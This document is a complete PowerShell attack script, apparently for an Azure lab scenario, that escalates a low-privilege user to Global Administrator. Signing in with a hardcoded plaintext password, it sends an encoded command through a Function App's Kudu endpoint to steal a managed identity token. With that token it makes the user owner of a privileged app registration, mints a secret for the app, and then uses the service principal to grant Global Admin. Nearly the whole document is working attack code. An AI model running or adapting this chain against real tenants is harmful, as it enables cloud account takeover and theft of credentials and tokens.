This can be executed as a powershell script

#---------------------------------------------------


Disconnect-AzAccount
Disconnect-AzureAD
#-----------------ConnectToAzureUser-----------------------------#
$us4Username = "us4@xmazuretestgmail.onmicrosoft.com"
$us4Password = "Hahahaha147222343!"
$SecurePassword = ConvertTo-SecureString $us4Password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential -argumentlist $us4Username, $SecurePassword
Connect-AzureAD –Credential $Credential
Connect-AzAccount -Credential $Credential

#-------------------------------------------ReconnaissanceUS4----------------------------------------------#

#----------------Azure-ARM-------------------#
Get-AzRoleAssignment

$us4RoleAssignment = (Get-AzRoleAssignment).RoleDefinitionId

(Get-AzRoleDefinition -Id  $us4RoleAssignment).Actions

#----------------ADDirectoryRole-------------------#
$us4ADDirectoryRole = (Get-AzureADDirectoryRole | Where-Object{$_.DisplayName -eq "Global Reader"}).objectID

#Show that US4 have "Global Reader" permission
Get-AzureADDirectoryRoleMember -ObjectId $us4ADDirectoryRole

#-------------------------------------------AttackSCM-------------------------------------------------------#

#----------------ReconForID4-------------------#

$id4ADDirectoryRole = (Get-AzureADDirectoryRole | Where-Object{$_.DisplayName -eq "Application Administrator"}).objectID

#Found ID4 have "Application Administrator" permission
Get-AzureADDirectoryRoleMember -ObjectId $id4ADDirectoryRole

#Get ID4 Client ID

$id4ClientID = (Get-AzUserAssignedIdentity -Name id4 -ResourceGroupName sc4).ClientId

$id4ClientID

#----------------ExecuteCommandKuduGetID4Token-------------------#

$GeTokenPayload = '$headers=@{"X-IDENTITY-HEADER"=$env:IDENTITY_HEADER};$ClientId ="74eeca0b-fa67-4645-aed9-ab699e4729ef";$ProgressPreference = "SilentlyContinue";$response = Invoke-WebRequest -UseBasicParsing -Uri "$($env:IDENTITY_ENDPOINT)?resource=https://graph.microsoft.com&client_id=$ClientId&api-version=2019-08-01" -Headers $headers;$response.RawContent'
$Encoded64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($GeTokenPayload))
$us4Token = (Get-AzAccessToken).Token
$method = "POST"
$URI = "https://sc4-windows-function-app.scm.azurewebsites.net:443/api/command"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "sc4-windows-function-app.scm.azurewebsites.net")
$userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
$headers.Add("Authorization", "Bearer $($us4Token)")
$contentType = "application/json"
$body = "{
`"command`":`"powershell -EncodedCommand $($Encoded64)`",
`"dir`":`"C:\\home`"
}
"
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -ContentType $contentType -UserAgent $userAgent -Body $body)
$response.Content

#Token For ID4
$id4Token = (($response.Content).Split('"')[6]).split("\")

$id4Token
#-------------------------------------------AttackAppRegistrations-------------------------------------------------------#


#----------------ReconForscenario4App-------------------#

$appObjectID = (Get-AzureADApplication -SearchString scenario4App).ObjectID
$app = Get-AzureADApplication -ObjectId $appObjectID
$app.requiredResourceAccess | ConvertTo-Json -Depth 3

$scenario4Role = (((($app.requiredResourceAccess | ConvertTo-Json -Depth 3).split("Id:")[7]).split(",")[0]).trim()).split('"')[1]

#Show scenario4app have "RoleManagement.ReadWrite.Directory"

$scenario4SP = Get-AzureADServicePrincipal -All $true | Where-Object {$_.AppId -eq '00000003-0000-0000-c000-000000000000'}
$scenario4SP.AppRoles | Where-Object {$_.Id -eq $($scenario4Role)}

#Get All the requirement data for The RestAPI

$scenario4AppID = (Get-AzureADApplication -SearchString scenario4App).AppId
$scenario4ObjectID = (Get-AzureADApplication -SearchString scenario4App).objectid
$us4ObjectID = (Get-AzureADUser -SearchString us4).ObjectID

#----------------AddUS4OwnerOnscenario4App-------------------#

$method = "POST"
$URI = "https://graph.microsoft.com:443/v1.0//applications/$($scenario4ObjectID)/owners/`$ref"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "graph.microsoft.com")
$headers.Add("Accept", "text/html,application/xhtml+xml")
$headers.Add("Authorization", "Bearer $($id4Token)")
$contentType = "application/json"
$body = "{
`"@odata.id`":`"https://graph.microsoft.com/v1.0/directoryObjects/$($us4ObjectID)`"
}
"
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -ContentType $contentType -UserAgent $userAgent -WebSession $webSession -Body $body)

if($response.StatusCode -eq 200 -or $response.StatusCode -eq 204){
Write-Host "[+] The user us4 is scenario4App application owner!!"
Start-Sleep -s 10
}

Start-Sleep -s 10
#POC
$scenario4ObjectID = (Get-AzureADApplication -SearchString scenario4App).objectID
Get-AzureADApplicationOwner -ObjectId $scenario4ObjectID

#-------------------------------------------GetTheGlobalAdministrator-------------------------------------------------------#

#Use the new permission of us4 as owner

Try
{
Start-Sleep -s 10
$AppPassword = New-AzureADApplicationPasswordCredential -ObjectID $scenario4ObjectID
}
Catch
{
exit
}

$TenantID = (Get-AzSubscription).TenantId
Disconnect-AzAccount
Start-Sleep -s 10
$scenario4Token = $null


#----------------ConnectToServicePrincpal-------------------#
$AzureApplicationID = $scenario4AppID
$AzureTenantID = $TenantID
$AzurePassword = ConvertTo-SecureString $AppPassword.value -AsPlainText -Force
$psCred = New-Object System.Management.Automation.PSCredential($AzureApplicationID, $AzurePassword)
Try
{
Start-Sleep -s 10
Connect-AzAccount -Credential $psCred -TenantID $AzureTenantID -ServicePrincipal
}
Catch
{
exit
}

$GlobalAdministratorObjectID = (Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}).ObjectId

#Get SP Token
$APSUser = Get-AzContext *>&1
$resource = "https://graph.microsoft.com"
$scenario4Token = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.AuthenticationFactory.Authenticate(`
$APSUser.Account, `
$APSUser.Environment, `
$APSUser.Tenant.Id.ToString(), `
$null, `
[Microsoft.Azure.Commands.Common.Authentication.ShowDialog]::Never, `
$null, `
$resource).AccessToken

#----------------AddUS4TOGlobalAdministrators-------------------#

$method = "POST"
$URI = "https://graph.microsoft.com:443/v1.0/directoryRoles/$($GlobalAdministratorObjectID)/members/`$ref"
$headers = [System.Collections.Generic.Dictionary[string,string]]::new()
$headers.Add("Host", "graph.microsoft.com")
$headers.Add("Accept", "text/html,application/xhtml+xml")
$headers.Add("Authorization", "Bearer $($scenario4Token)")
$contentType = "application/json"
$body = "{
`"@odata.id`":`"https://graph.microsoft.com/v1.0/directoryObjects/$($us4ObjectID)`"
}
"
$response = (Invoke-WebRequest -Method $method -Uri $URI -Headers $headers -ContentType $contentType -UserAgent $userAgent -WebSession $webSession -Body $body)

if($response.StatusCode -eq 200 -or $response.StatusCode -eq 204){
Write-Host "[+] US4 Is Global Administrator Now"
Get-AzureADDirectoryRoleMember -ObjectID $GlobalAdministratorObjectID  | Where-Object {$_.DisplayName -eq "us4"}
}

Write-Host "[+]Done!!"
